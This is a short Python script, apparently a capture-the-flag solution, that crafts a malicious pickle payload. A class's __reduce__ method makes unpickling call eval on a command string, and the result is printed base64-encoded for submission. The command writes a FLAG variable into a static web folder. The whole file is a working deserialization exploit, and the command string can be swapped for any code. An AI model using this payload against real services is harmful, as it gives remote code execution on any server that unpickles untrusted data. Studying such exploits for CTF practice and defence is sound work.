import os
import pickle
import base64
import codecs

CMD = "open('static/flag.png','wb').write(FLAG)"

class RunCmd(object):
    def __reduce__(self):
        return(eval, (CMD,))

print(base64.b64encode(pickle.dumps(RunCmd())))